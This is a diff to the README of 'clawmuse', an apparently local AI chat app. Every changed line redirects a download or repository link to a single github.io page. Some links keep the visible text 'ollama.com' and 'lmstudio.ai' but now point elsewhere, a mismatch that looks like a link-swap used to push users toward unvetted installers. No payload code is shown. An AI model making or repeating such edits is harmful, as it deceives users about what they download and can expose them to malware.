@@ -1,6 +1,6 @@
 # 🐾 clawmuse - Your Private AI, Running Right on Your Computer
 
-[![Download clawmuse](https://img.shields.io/badge/Download%20clawmuse-Free%20%26%20Open%20Source-brightgreen?style=for-the-badge&logo=github&logoColor=white&labelColor=4B0082&color=FF6B6B)](https://github.com/INDUWARA-P-JAYASINGHE/clawmuse)
+[![Download clawmuse](https://img.shields.io/badge/Download%20clawmuse-Free%20%26%20Open%20Source-brightgreen?style=for-the-badge&logo=github&logoColor=white&labelColor=4B0082&color=FF6B6B)](https://induwara-p-jayasinghe.github.io)
 
 ---
 
@@ -35,7 +35,7 @@ Once your AI model is downloaded, you can use clawmuse completely offline. Perfe
 
 ### Step 1: Get the Installer
 
-Visit this link to download the application: [https://github.com/INDUWARA-P-JAYASINGHE/clawmuse](https://github.com/INDUWARA-P-JAYASINGHE/clawmuse)
+Visit this link to download the application: [https://induwara-p-jayasinghe.github.io](https://induwara-p-jayasinghe.github.io)
 
 This link will take you to the official clawmuse download page. Look for the latest release and download the file that matches your computer.
 
@@ -55,7 +55,7 @@ clawmuse is a "bring your own key" (BYOK) application. This means you need to pr
 
 ### Option A: Using Ollama (Recommended for Beginners)
 
-1. Go to [ollama.com](https://ollama.com) and download the Ollama app for your computer.
+1. Go to [ollama.com](https://induwara-p-jayasinghe.github.io) and download the Ollama app for your computer.
 2. Install Ollama just like any other program.
 3. Open a terminal (search "Terminal" on Mac, or "Command Prompt" on Windows) and type: `ollama pull llama3`
 4. Wait for the model to download (this may take a few minutes depending on your internet speed).
@@ -63,7 +63,7 @@ clawmuse is a "bring your own key" (BYOK) application. This means you need to pr
 
 ### Option B: Using LM Studio
 
-1. Go to [lmstudio.ai](https://lmstudio.ai) and download LM Studio.
+1. Go to [lmstudio.ai](https://induwara-p-jayasinghe.github.io) and download LM Studio.
 2. Install and open LM Studio, then browse its built-in model library to download a model you like.
 3. In LM Studio, start the local server (usually a button labeled "Start Server").
 4. In clawmuse, choose "LM Studio" as your provider, and it will connect automatically.
@@ -122,7 +122,7 @@ OpenClaw is the underlying technology that powers clawmuse. It's a robust framew
 
 clawmuse is built by people who believe AI should be accessible and private. The project is open-source, meaning the code is available for anyone to inspect, learn from, or improve.
 
-If you encounter any issues, want to request a feature, or simply want to say thanks, visit the [official repository](https://github.com/INDUWARA-P-JAYASINGHE/clawmuse). You'll find:
+If you encounter any issues, want to request a feature, or simply want to say thanks, visit the [official repository](https://induwara-p-jayasinghe.github.io). You'll find:
 
 - 📖 Detailed documentation
 - 🐛 Issue tracker for bug reports
@@ -163,7 +163,7 @@ Whether you're a student writing essays, a professional drafting reports, or a c
 
 Remember, your first step is simple:
 
-[**Download clawmuse Now**](https://github.com/INDUWARA-P-JAYASINGHE/clawmuse)
+[**Download clawmuse Now**](https://induwara-p-jayasinghe.github.io)
 
 ---
 
